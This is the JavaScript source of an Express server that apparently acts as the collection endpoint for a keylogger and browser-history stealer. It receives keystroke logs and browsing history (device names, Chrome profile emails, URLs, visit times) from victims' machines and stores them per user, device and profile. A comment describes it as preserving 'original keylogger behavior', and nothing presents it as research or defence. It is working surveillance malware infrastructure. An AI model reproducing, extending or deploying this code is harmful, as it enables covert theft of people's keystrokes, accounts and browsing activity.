import e from "express";
import CORS from "cors";
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const DATA_DIR = path.join(path.dirname(__filename), "..", "keylogs");
const HISTORY_DIR = path.join(path.dirname(__filename), "..", "browser_history");
const HISTORY_FILE = path.join(HISTORY_DIR, "history.json");
const HISTORY_QUEUE_MAX = parseInt(process.env.HISTORY_QUEUE_MAX || "5000", 10);
const HISTORY_FLUSH_INTERVAL_MS = parseInt(process.env.HISTORY_FLUSH_INTERVAL_MS || "100", 10);

const ensureDir = () => {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  }
};

const ensureHistoryDir = () => {
  if (!fs.existsSync(HISTORY_DIR)) {
    fs.mkdirSync(HISTORY_DIR, { recursive: true });
  }
};

const saveToFile = (userId, data) => {
  ensureDir();
  const filePath = path.join(DATA_DIR, userId + ".json");
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
};

const loadFromFile = (userId) => {
  ensureDir();
  const filePath = path.join(DATA_DIR, userId + ".json");

  let fileContent;
  try {
    fileContent = fs.readFileSync(filePath, "utf-8");
    fileContent = JSON.parse(fileContent);
  } catch (e) {
    fileContent = [];
  }

  data[userId] = fileContent;
};

const loadHistoryFile = () => {
  ensureHistoryDir();
  try {
    const raw = fs.readFileSync(HISTORY_FILE, "utf-8");
    return JSON.parse(raw);
  } catch (e) {
    return {};
  }
};

const saveHistoryFile = (payload) => {
  ensureHistoryDir();
  fs.writeFileSync(HISTORY_FILE, JSON.stringify(payload, null, 2));
};

const upsertBrowserHistory = (userId, keylog) => {
  // keylog: { device_id, device_user, device_name, app, profile:{id,email}, history:{...} }
  const map = loadHistoryFile() || {};

  const deviceBlob = typeof map[userId] === "object" && map[userId] !== null ? map[userId] : {};
  deviceBlob.device_id = keylog.device_id || userId;
  deviceBlob.device_user = keylog.device_user || deviceBlob.device_user || "";
  deviceBlob.device_name = keylog.device_name || deviceBlob.device_name || "";
  deviceBlob.app = keylog.app || deviceBlob.app || "chrome";

  let profiles = deviceBlob.profiles;
  if (typeof profiles !== "object" || profiles === null || Array.isArray(profiles)) {
    profiles = {};
  }

  const profileId = keylog.profile?.id || "Default";
  const profileEmail = keylog.profile?.email || "";

  let profile = profiles[profileId];
  if (typeof profile !== "object" || profile === null || Array.isArray(profile)) {
    profile = { id: profileId, email: profileEmail, history: {} };
  }
  if (profileEmail && !profile.email) {
    profile.email = profileEmail;
  }

  let history = profile.history;
  if (typeof history !== "object" || history === null || Array.isArray(history)) {
    history = {};
  }

  const hKeyBase = `${keylog.history?.last_visit_time || ""}:${keylog.history?.url || ""}`;
  const dup = Object.values(history).find(
    (h) => `${h?.last_visit_time || ""}:${h?.url || ""}` === hKeyBase
  );
  if (!dup) {
    const nextKey = `h-${Object.keys(history).length + 1}`;
    history[nextKey] = keylog.history || {};
  }

  profile.history = history;
  profiles[profileId] = profile;
  deviceBlob.profiles = profiles;

  map[userId] = deviceBlob;
  saveHistoryFile(map);
  return deviceBlob;
};

let app = e();

let data = {};
let historyQueue = [];

app.use(CORS());
app.use(e.json());

// Legacy endpoint; mirrors original keylogger behavior (save on close).
app.post("/", (req, res) => {
  let { userId, keylog, type } = req.body;
  console.log({ userId, keylog, type });
  if (!userId) return res.status(400).json({ error: "missing userId" });
  if (!data[userId]) loadFromFile(userId);
  if (keylog) {
    // keep legacy keylog behavior
    data[userId].push(keylog);
    // enqueue to structured browser history store
    enqueueHistory(userId, [keylog]);
  }
  if (type && type === "close") saveToFile(userId, data[userId]);
  res.json({ msg: "sent successfully" });
});

// New explicit browser history endpoint (structured per device/profile/history)
app.post("/history", (req, res) => {
  const { userId, keylog } = req.body;
  if (!userId || !keylog) {
    return res.status(400).json({ error: "userId and keylog required" });
  }
  const payloads = Array.isArray(keylog) ? keylog : [keylog];
  const enqueued = enqueueHistory(userId, payloads);
  if (!enqueued) {
    return res.status(429).json({ error: "history queue full, dropped entries" });
  }
  res.json({ msg: "history enqueued", count: payloads.length });
});

const enqueueHistory = (userId, keylogs) => {
  if (!Array.isArray(keylogs)) return false;
  if (historyQueue.length + keylogs.length > HISTORY_QUEUE_MAX) {
    return false;
  }
  keylogs.forEach((kl) => historyQueue.push({ userId, keylog: kl }));
  return true;
};

setInterval(() => {
  const task = historyQueue.shift();
  if (!task) return;
  try {
    upsertBrowserHistory(task.userId, task.keylog);
  } catch (err) {
    console.error("Failed to persist history task", err);
  }
}, HISTORY_FLUSH_INTERVAL_MS);

app.listen(3000, "0.0.0.0", () => {
  console.log("Server is running in http://localhost:3000");
});
